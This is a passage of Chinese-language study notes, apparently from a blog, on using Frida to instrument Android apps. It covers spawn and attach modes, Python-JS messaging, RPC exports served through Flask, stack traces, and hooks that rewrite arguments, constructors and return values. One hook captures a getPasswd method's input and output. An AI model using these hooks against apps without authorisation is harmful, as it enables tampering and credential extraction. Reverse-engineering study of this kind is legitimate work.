class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">rdev = frida.get_usb_device()</span><br><span class="line">pid = rdev.spawn([<span class="string">&quot;com.xiaojianbang.app&quot;</span>])    <span class="comment">#已挂起方式创建进程</span></span><br><span class="line">process = rdev.attach(pid)                  <span class="comment">#附加到该进程</span></span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.load()</span><br><span class="line">rdev.resume(pid)            <span class="comment">#创建完脚本, 恢复进程运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="python脚本实现frida的attach模式"><a href="#python脚本实现frida的attach模式" class="headerlink" title="python脚本实现frida的attach模式"></a>python脚本实现frida的attach模式</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line">device=frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">s=device.attach(<span class="string">&quot;进程包名&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;写好的js脚本&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    script=s.create_script(f.read())</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="python和js-frida脚本交互"><a href="#python和js-frida脚本交互" class="headerlink" title="python和js frida脚本交互"></a>python和js frida脚本交互</h2><p>py脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message,payload</span>):  <span class="comment">#js中执行send函数后要回调的函数,用于处理从js发送的消息 为json形式</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        script.post(&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&quot;hello&quot;</span>&#125;)  <span class="comment">#向js传数据</span></span><br><span class="line"></span><br><span class="line">rdev = frida.get_usb_device()</span><br><span class="line">pid = rdev.spawn([<span class="string">&quot;com.xiaojianbang.app&quot;</span>])    <span class="comment">#已挂起方式创建进程</span></span><br><span class="line">rdev.resume(pid)            <span class="comment">#创建完脚本, 恢复进程运行</span></span><br><span class="line">process = rdev.attach(pid)                  <span class="comment">#附加到该进程</span></span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>js脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> a=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;xxx.xxx&quot;</span>);</span><br><span class="line">        a.<span class="property">getPasswd</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result=<span class="variable language_">this</span>.<span class="title function_">getPasswd</span>(arg);</span><br><span class="line">            <span class="title function_">send</span>(arg+<span class="string">&#x27;-&#x27;</span>+result);  <span class="comment">//这个就是python中message函数收到的信息</span></span><br><span class="line">            <span class="title function_">recv</span>(<span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(msg));</span><br><span class="line">                result=msg[<span class="string">&#x27;data&#x27;</span>]  <span class="comment">//修改返回值</span></span><br><span class="line">            &#125;).<span class="title function_">wait</span>()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p>通过rpc 想要把perform内的方法的返回值在py中printf，需要send(result)</p><p>rpc使python主动调用js中的函数</p><p>js脚本中需添加如下命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpc.<span class="property">exports</span>=&#123;<span class="attr">xxxfunc1</span>:func1,</span><br><span class="line">             <span class="attr">xxxfunc2</span>:func2,</span><br><span class="line">            &#125;                        </span><br></pre></td></tr></table></figure><p>py中添加如下命令</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script.exports.xxxfunc1()</span><br><span class="line">script.exports.xxxfunc2()</span><br></pre></td></tr></table></figure><h2 id="配置flask实现HTTP接口调用"><a href="#配置flask实现HTTP接口调用" class="headerlink" title="配置flask实现HTTP接口调用"></a>配置flask实现HTTP接口调用</h2><p>首先需要再js代码中实现一个主动调用，且rpc.exports{xxx:xxx,yyy:yyy,}</p><p>然后py代码中</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">js = <span class="built_in">open</span>(<span class="string">&#x27;test.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>).read()</span><br><span class="line"><span class="comment"># session = frida.get_usb_device().attach(&#x27;me.ele&#x27;)</span></span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&#x27;com.wjmt.app&#x27;</span>)</span><br><span class="line">script = session.create_script(js)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#data解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_class</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    res = script.exports.xxx(postdata) //要rpc的函数</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/encrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#url加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_class</span>():</span><br><span class="line">    data = request.get_data()</span><br><span class="line">    json_data = json.loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(postdata)</span><br><span class="line">    res = script.exports.yyy(postdata)   ////要rpc的函数</span><br><span class="line">    <span class="keyword">return</span> res  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line">    </span><br><span class="line">执行：</span><br><span class="line">curl -s -X POST <span class="string">&quot;http://127.0.0.1:5000/函数名&quot;</span> -H <span class="string">&quot;Content-Type:application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;data&quot;:&quot;传递参数&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">函数名 ==》 python中的app.route声明的名字</span><br></pre></td></tr></table></figure><h2 id="获得Context："><a href="#获得Context：" class="headerlink" title="获得Context："></a>获得Context：</h2><p>var context=Java.use(“android.app.ActivityThread”).currentApplication().getApplicationContext();</p><p>原因：Java.use(“android.app.ActivityThread”).currentApplication()返回类型Application，跟进Application发现它继承ContextWrapper，而里面有个getApplicationContext方法返回Context</p><h1 id="Hook-java层"><a href="#Hook-java层" class="headerlink" title="Hook java层"></a>Hook java层</h1><p>demo：43课的HookTestDemo</p><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>java中打印调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>();  <span class="comment">//其中可以传入一个字符串 然后在catch中 通过e.getMessage()获得。</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     e.printStackTrace();  <span class="comment">//logcat中打印</span></span><br><span class="line">     <span class="keyword">for</span> (StackTraceElement stackTraceElement : e.getStackTrace()) &#123;</span><br><span class="line">         Log.d(TAG, stackTraceElement);</span><br><span class="line">     &#125; </span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="type">String</span> <span class="variable">stackTraceString</span> <span class="operator">=</span> Log.getStackTraceString(<span class="keyword">new</span> <span class="title class_">Throwable</span>()/<span class="keyword">new</span> <span class="title class_">Exception</span>());</span><br><span class="line">Log.d(<span class="string">&quot;StackTrace&quot;</span>, stackTraceString);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数调用栈 1</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> stack = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.Throwable&#x27;</span>).$new());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用栈 2</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> log = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.Throwable&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> t = throwable.$new()</span><br><span class="line">log.<span class="title function_">d</span>(<span class="string">&#x27;zxk1ng&#x27;</span>,<span class="string">&#x27;Stack Dump&#x27;</span>,log.<span class="title function_">getStackTraceString</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用栈 3</span></span><br><span class="line"><span class="keyword">var</span> threadef = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.Thread&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用栈 4</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> e = <span class="title class_">Exception</span>.$new();</span><br><span class="line">    <span class="keyword">var</span> stacks=e.<span class="title function_">getStackTrace</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(stacks.<span class="title function_">toString</span>().<span class="title function_">replace</span>(<span class="regexp">/,/g</span>,<span class="string">&quot;\n&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="frida构造普通方法"><a href="#frida构造普通方法" class="headerlink" title="frida构造普通方法"></a>frida构造普通方法</h2><p>demo为xjb第十四课</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line">        <span class="title class_">Utils</span>.<span class="property">getCalc</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getCalc：&#x27;</span>,a,b); <span class="comment">//输出原来的参数</span></span><br><span class="line">            a=<span class="number">2000</span>;    <span class="comment">//修改参数</span></span><br><span class="line">            b=<span class="number">3000</span>;    <span class="comment">//修改参数</span></span><br><span class="line">            <span class="keyword">var</span> retval=<span class="variable language_">this</span>.<span class="title function_">getCalc</span>(a,b); <span class="comment">//存放修改参数后 函数的返回值</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;retval：&#x27;</span>,retval); <span class="comment">//输出修改后返回值 5000</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">4000</span>;                   <span class="comment">//让手机中回显4000</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest1</span>();</span><br></pre></td></tr></table></figure><h2 id="frida构造函数以及重载函数"><a href="#frida构造函数以及重载函数" class="headerlink" title="frida构造函数以及重载函数"></a>frida构造函数以及重载函数</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Money</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Money&#x27;</span>);</span><br><span class="line">        <span class="title class_">Money</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Money：&#x27;</span>,a,b);</span><br><span class="line">            a = <span class="string">&#x27;欧元&#x27;</span>;</span><br><span class="line">            b = <span class="number">2000</span>;</span><br><span class="line">            <span class="variable language_">this</span>.$init(a,b);   </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hooktest2</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $init 构造函数  overload 重载</span></span><br></pre></td></tr></table></figure><h2 id="frida实例化对象"><a href="#frida实例化对象" class="headerlink" title="frida实例化对象"></a>frida实例化对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook普通函数与修改函数参数返回值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooketst1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Utils</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.xiaojianbang.app.Utils&#x27;</span>);</span><br><span class="line">        <span class="title class_">Utils</span>.<span class="property">getCalc</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getCalc: &#x27;</span>, a, b);</span><br><span class="line">            <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> infoStr = money.$new(<span class="string">&#x27;RMB&#x27;</span>, <span class="number">1000</span>).<span class="title function_">getInfo</span>();    <span class="comment">//对象实例化,</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;infoStr: &#x27;</span>, infoStr);</span><br><span class="line">            a = <span class="number">2000</span>;</span><br><span class="line">            b = <span class="number">3000</span>;</span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">getCalc</span>(a, b);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;retval: &#x27;</span>, retval);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hook构造函数以及重载函数的HOOK</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> money = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>);</span><br><span class="line">        money.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str, num</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(str, num);</span><br><span class="line">            str = <span class="string">&quot;欧元&quot;</span>;</span><br><span class="line">            num = <span class="number">2000</span>;</span><br><span class="line">            <span class="variable language_">this</span>.$init(str, num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest1</span>();</span><br><span class="line"><span class="title function_">hooktest2</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Hook方法的所有重载"><a href="#Hook方法的所有重载" class="headerlink" title="Hook方法的所有重载"></a>Hook方法的所有重载</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hooktest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        <span class="comment">//console.log(utils.test.overloads.length);</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; utils.<span class="property">test</span>.<span class="property">overloads</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            utils.<span class="property">test</span>.<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(JSON.stringify(arguments)); //输出参数 </span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有参数&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;调用了没有参数的&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>).<span class="title function_">indexOf</span>(<span class="string">&quot;Money&quot;</span>) != -<span class="number">1</span>)&#123;  <span class="comment">//有</span></span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;调用了Money参数的&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;调用了Money参数的&quot;</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;调用了int参数的&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">arguments</span>));</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;调用了int参数的&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;zxk1ng&#x27;</span>);</span><br><span class="line"><span class="title function_">hooktest3</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//arguments可以类比成一个数组用，arguments[0]...</span></span><br><span class="line"><span class="comment">//JSON.stringify JSON对象或值转化为js字符串</span></span><br></pre></td></tr></table></figure><h2 id="Hook修改类的字段"><a href="#Hook修改类的字段" class="headerlink" title="Hook修改类的字段"></a>Hook修改类的字段</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 